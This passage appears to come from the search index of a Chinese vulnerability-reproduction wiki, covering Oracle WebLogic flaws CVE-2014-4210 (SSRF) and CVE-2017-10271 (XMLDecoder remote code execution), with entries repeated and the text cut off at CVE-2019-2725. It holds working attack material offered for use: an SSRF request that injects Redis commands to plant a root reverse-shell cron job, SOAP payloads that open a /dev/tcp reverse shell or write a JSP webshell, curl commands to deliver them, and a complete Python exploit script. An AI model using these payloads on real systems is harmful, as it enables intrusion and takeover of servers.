\u53d1\u9001payload http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch = name & txtSearchname = sdf & txtSearchkey = & txtSearchfor = & selfor = Business+location & btnSubmit = Search & operator = http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa \u53d1\u9001\u540e\u76d1\u542c 172.19.0.3 9999\u7aef\u53e3 \u7b49\u5f85\u53cd\u5f39shell [!NOTE] \u6700\u540e\u8865\u5145\u4e00\u4e0b\uff0c\u53ef\u8fdb\u884c\u5229\u7528\u7684cron\u6709\u5982\u4e0b\u51e0\u4e2a\u5730\u65b9\uff1a /etc/crontab \u8fd9\u4e2a\u662f\u80af\u5b9a\u7684 /etc/cron.d/* \u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5230\u8be5\u76ee\u5f55\u4e0b\uff0c\u6548\u679c\u548ccrontab\u76f8\u540c\uff0c\u683c\u5f0f\u4e5f\u8981\u548c/etc/crontab\u76f8\u540c\u3002\u6f0f\u6d1e\u5229\u7528\u8fd9\u4e2a\u76ee\u5f55\uff0c\u53ef\u4ee5\u505a\u5230\u4e0d\u8986\u76d6\u4efb\u4f55\u5176\u4ed6\u6587\u4ef6\u7684\u60c5\u51b5\u8fdb\u884c\u5f39shell\u3002 /var/spool/cron/root centos\u7cfb\u7edf\u4e0broot\u7528\u6237\u7684cron\u6587\u4ef6 /var/spool/cron/crontabs/root debian\u7cfb\u7edf\u4e0broot\u7528\u6237\u7684cron\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 GitHub\u811a\u672c CVE-2014-4210+Redis\u672a\u6388\u6743\u8bbf\u95ee \u5b58\u6d3b\u626b\u63cf: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172 .16.5.0/24 --type livedetect \u7aef\u53e3\u626b\u63cf: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172 .16.5.0/24 --type portscan Goby && POC \u00b6 [!NOTE] Weblogic SSRF\u6f0f\u6d1e CVE-2014-4210","title":"Weblogic SSRF\u6f0f\u6d1e CVE-2014-4210"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#weblogic-ssrf\u6f0f\u6d1e-cve-2014-4210","text":"","title":"Weblogic SSRF\u6f0f\u6d1e CVE-2014-4210"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Weblogic\u4e2d\u5b58\u5728\u4e00\u4e2aSSRF\u6f0f\u6d1e\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u53d1\u9001\u4efb\u610fHTTP\u8bf7\u6c42\uff0c\u8fdb\u800c\u653b\u51fb\u5185\u7f51\u4e2dredis\u3001fastcgi\u7b49\u8106\u5f31\u7ec4\u4ef6\uff0c\u6b64\u6f0f\u6d1e\u53ef\u901a\u8fc7HTTP\u534f\u8bae\u5229\u7528\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u5f71\u54cd\u53d7\u5f71\u54cd\u7ec4\u4ef6\u7684\u673a\u5bc6\u6027","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Oracle WebLogic Server 10.0.2.0 Oracle WebLogic Server 10.3.6.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#\u73af\u5883\u642d\u5efa","text":"git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/ssrd docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#\u6f0f\u6d1e\u590d\u73b0","text":"\u51fa\u73b0\u6f0f\u6d1e\u7684 URL\u4e3a : http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp \u4f7f\u7528 payload \u8fdb\u884c\u63a2\u6d4b, \u5c06\u63a2\u6d4b\u7684\u4f4d\u7f6e\u5199\u5728 operator\u53c2\u6570\u4e2d [!NOTE] \u6ce8\u610f\u9700\u8981\u77e5\u9053\u5185\u7f51 IP http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001 \u901a\u8fc7\u67e5\u770b\u62a5\u9519\u5185\u5bb9\u6765\u8fdb\u884c\u5224\u65ad \u5b58\u5728\u7684\u62a5\u9519\u5185\u5bb9\u5982\u56fe\uff0c\u5173\u952e\u5b57\u4e3a 404 , \u4f8b\u5982\u628a operator \u53c2\u6570\u6539\u6210 http://xxx.xxx.xxx.xxx:7000 \u8fd9\u6837\u4e0d\u5b58\u5728\u7684\u5219\u62a5\u9519\u5185\u5bb9\u5982\u4e0b\u56fe \u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u6cd5\u5c31\u53ef\u4ee5\u63a2\u6d4b\u5185\u7f51\u7684\u5f00\u653e\u7aef\u53e3\u60c5\u51b5\uff0c\u4f8b\u5982\u5185\u7f51\u4e2d\u6709\u4e00\u53f0\u4e3b\u673a IP\uff1a172.19.0.2 \u5f00\u542f\u4e86 6379\u7aef\u53e3\u7684redis\u670d\u52a1 \u5982\u679c\u8bbf\u95ee\u7684\u975ehttp\u534f\u8bae\uff0c\u5219\u4f1a\u8fd4\u56de**did not have a valid SOAP content-type**\uff0c\u8fd9\u6837\u901a\u8fc7\u9519\u8bef\u7684\u4e0d\u540c\uff0c\u5373\u53ef\u63a2\u6d4b\u5185\u7f51\u72b6\u6001\u3002 Weblogic\u7684SSRF\u6709\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u7279\u70b9\uff0c\u5176\u867d\u7136\u662f\u4e00\u4e2a\u201cGET\u201d\u8bf7\u6c42\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f20\u5165 %0a%0d \u6765\u6ce8\u5165\u6362\u884c\u7b26\uff0c\u800c\u67d0\u4e9b\u670d\u52a1\uff08\u5982redis\uff09\u662f\u901a\u8fc7\u6362\u884c\u7b26\u6765\u5206\u9694\u6bcf\u6761\u547d\u4ee4\uff0c\u4e5f\u5c31\u8bf4\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8be5SSRF\u653b\u51fb\u5185\u7f51\u4e2d\u7684redis\u670d\u52a1\u5668\u3002 \u53d1\u9001\u4e09\u6761redis\u547d\u4ee4\uff0c\u5c06\u5f39shell\u811a\u672c\u5199\u5165**/etc/crontab** \u4e2d\uff1a set 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save \u63a5\u7740\u518d\u5c06\u8bf7\u6c42\u8fdb\u884c url\u7f16\u7801 , [!NOTE] \u6ce8\u610f\uff0c\u6362\u884c\u7b26\u662f\u201c\\r\\n\u201d\uff0c\u4e5f\u5c31\u662f\u201c%0D%0A\u201d test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa \u53d1\u9001payload http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch = name & txtSearchname = sdf & txtSearchkey = & txtSearchfor = & selfor = Business+location & btnSubmit = Search & operator = http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa \u53d1\u9001\u540e\u76d1\u542c 172.19.0.3 9999\u7aef\u53e3 \u7b49\u5f85\u53cd\u5f39shell [!NOTE] \u6700\u540e\u8865\u5145\u4e00\u4e0b\uff0c\u53ef\u8fdb\u884c\u5229\u7528\u7684cron\u6709\u5982\u4e0b\u51e0\u4e2a\u5730\u65b9\uff1a /etc/crontab \u8fd9\u4e2a\u662f\u80af\u5b9a\u7684 /etc/cron.d/* \u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5230\u8be5\u76ee\u5f55\u4e0b\uff0c\u6548\u679c\u548ccrontab\u76f8\u540c\uff0c\u683c\u5f0f\u4e5f\u8981\u548c/etc/crontab\u76f8\u540c\u3002\u6f0f\u6d1e\u5229\u7528\u8fd9\u4e2a\u76ee\u5f55\uff0c\u53ef\u4ee5\u505a\u5230\u4e0d\u8986\u76d6\u4efb\u4f55\u5176\u4ed6\u6587\u4ef6\u7684\u60c5\u51b5\u8fdb\u884c\u5f39shell\u3002 /var/spool/cron/root centos\u7cfb\u7edf\u4e0broot\u7528\u6237\u7684cron\u6587\u4ef6 /var/spool/cron/crontabs/root debian\u7cfb\u7edf\u4e0broot\u7528\u6237\u7684cron\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#\u6f0f\u6d1e\u5229\u7528poc","text":"GitHub\u811a\u672c CVE-2014-4210+Redis\u672a\u6388\u6743\u8bbf\u95ee \u5b58\u6d3b\u626b\u63cf: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172 .16.5.0/24 --type livedetect \u7aef\u53e3\u626b\u63cf: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172 .16.5.0/24 --type portscan","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/#goby--poc","text":"[!NOTE] Weblogic SSRF\u6f0f\u6d1e CVE-2014-4210","title":"Goby &amp;&amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/","text":"Weblogic XMLDecoder \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2017-10271 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weblogic\u7684WLS Security\u7ec4\u4ef6\u5bf9\u5916\u63d0\u4f9bwebservice\u670d\u52a1\uff0c\u5176\u4e2d\u4f7f\u7528\u4e86XMLDecoder\u6765\u89e3\u6790\u7528\u6237\u4f20\u5165\u7684XML\u6570\u636e\uff0c\u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 \u73af\u5883\u642d\u5efa \u00b6 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5bf9 http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType \u8fdb\u884c\u8bbf\u95ee\uff0c\u5b58\u5728\u8fd9\u4e2aurl\u5219\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e \u5176\u4ed6\u53ef\u5229\u7528URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 \u4f7f\u7528POST\u65b9\u6cd5\u4e0a\u4f20\u4ee5\u4e0b\u6570\u636e\u53cd\u5f39\u4e00\u4e2ashell <soapenv:Envelope xmlns:soapenv= \"http://schemas.xmlsoap.org/soap/envelope/\" > <soapenv:Header> <work:WorkContext xmlns:work= \"http://bea.com/2004/06/soap/workarea/\" > <java version= \"1.4.0\" class= \"java.beans.XMLDecoder\" > <void class= \"java.lang.ProcessBuilder\" > <array class= \"java.lang.String\" length= \"3\" > <void index= \"0\" > <string> /bin/bash </string> </void> <void index= \"1\" > <string> -c </string> </void> <void index= \"2\" > <string> bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0 &gt;&amp; 1 </string> </void> </array> <void method= \"start\" /></void> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \u4f7f\u7528Curl\u53cd\u5f39shell (\u5c06\u4e0a\u9762\u7684xml\u6570\u636e\u4fdd\u5b58\u4e3apoc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" \u4e5f\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u5199\u5165webshell\u6587\u4ef6 <soapenv:Envelope xmlns:soapenv= \"http://schemas.xmlsoap.org/soap/envelope/\" > <soapenv:Header> <work:WorkContext xmlns:work= \"http://bea.com/2004/06/soap/workarea/\" > <java><java version= \"1.4.0\" class= \"java.beans.XMLDecoder\" > <object class= \"java.io.PrintWriter\" > <string> servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp </string> <void method= \"println\" ><string> <![CDATA[ <% out.print(\"test\"); %> ]]> </string> </void> <void method= \"close\" /> </object></java></java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp \u5373\u53ef\u5f97\u5230\u5199\u5165\u7684\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u5229\u7528 weblogic-scan \u5feb\u901f\u68c0\u6d4b [!NOTE] \u53cd\u5f39shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Weblogic 10.3.6.0.0 \\033 [0m' ) print ( '+ \\033 [34m Weblogic 12.1.3.0.0 \\033 [0m' ) print ( '+ \\033 [34m Weblogic 12.2.1.0.0 \\033 [0m' ) print ( '+ \\033 [34m Weblogic 12.2.1.2.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2017-10271.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell(\u53cd\u5f39shell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , IP , PORT ): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\" : \"text/xml\" , \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } data = \"\"\" <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>bash -i &gt;&amp; /dev/tcp/ %s / %s 0&gt;&amp;1</string> </void> </array> <void method=\"start\"/></void> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \"\"\" % ( IP , PORT ) try : response = requests . request ( \"POST\" , url = vuln_url , headers = headers , data = data ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_1 ( target_url , IP , PORT )","title":"Weblogic XMLDecoder \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2017-10271"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/#weblogic-xmldecoder-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2017-10271","text":"","title":"Weblogic XMLDecoder \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2017-10271"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Weblogic\u7684WLS Security\u7ec4\u4ef6\u5bf9\u5916\u63d0\u4f9bwebservice\u670d\u52a1\uff0c\u5176\u4e2d\u4f7f\u7528\u4e86XMLDecoder\u6765\u89e3\u6790\u7528\u6237\u4f20\u5165\u7684XML\u6570\u636e\uff0c\u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/#\u73af\u5883\u642d\u5efa","text":"git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5bf9 http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType \u8fdb\u884c\u8bbf\u95ee\uff0c\u5b58\u5728\u8fd9\u4e2aurl\u5219\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e \u5176\u4ed6\u53ef\u5229\u7528URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 \u4f7f\u7528POST\u65b9\u6cd5\u4e0a\u4f20\u4ee5\u4e0b\u6570\u636e\u53cd\u5f39\u4e00\u4e2ashell <soapenv:Envelope xmlns:soapenv= \"http://schemas.xmlsoap.org/soap/envelope/\" > <soapenv:Header> <work:WorkContext xmlns:work= \"http://bea.com/2004/06/soap/workarea/\" > <java version= \"1.4.0\" class= \"java.beans.XMLDecoder\" > <void class= \"java.lang.ProcessBuilder\" > <array class= \"java.lang.String\" length= \"3\" > <void index= \"0\" > <string> /bin/bash </string> </void> <void index= \"1\" > <string> -c </string> </void> <void index= \"2\" > <string> bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0 &gt;&amp; 1 </string> </void> </array> <void method= \"start\" /></void> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \u4f7f\u7528Curl\u53cd\u5f39shell (\u5c06\u4e0a\u9762\u7684xml\u6570\u636e\u4fdd\u5b58\u4e3apoc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" \u4e5f\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u5199\u5165webshell\u6587\u4ef6 <soapenv:Envelope xmlns:soapenv= \"http://schemas.xmlsoap.org/soap/envelope/\" > <soapenv:Header> <work:WorkContext xmlns:work= \"http://bea.com/2004/06/soap/workarea/\" > <java><java version= \"1.4.0\" class= \"java.beans.XMLDecoder\" > <object class= \"java.io.PrintWriter\" > <string> servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp </string> <void method= \"println\" ><string> <![CDATA[ <% out.print(\"test\"); %> ]]> </string> </void> <void method= \"close\" /> </object></java></java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp \u5373\u53ef\u5f97\u5230\u5199\u5165\u7684\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20XMLDecoder%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-10271/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u5229\u7528 weblogic-scan \u5feb\u901f\u68c0\u6d4b [!NOTE] \u53cd\u5f39shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Weblogic 10.3.6.0.0 \\033 [0m' ) print ( '+ \\033 [34m Weblogic 12.1.3.0.0 \\033 [0m' ) print ( '+ \\033 [34m Weblogic 12.2.1.0.0 \\033 [0m' ) print ( '+ \\033 [34m Weblogic 12.2.1.2.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2017-10271.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell(\u53cd\u5f39shell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , IP , PORT ): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\" : \"text/xml\" , \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } data = \"\"\" <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>bash -i &gt;&amp; /dev/tcp/ %s / %s 0&gt;&amp;1</string> </void> </array> <void method=\"start\"/></void> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \"\"\" % ( IP , PORT ) try : response = requests . request ( \"POST\" , url = vuln_url , headers = headers , data = data ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_1 ( target_url , IP , PORT )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/","text":"Weblogic \u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2019-2725 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 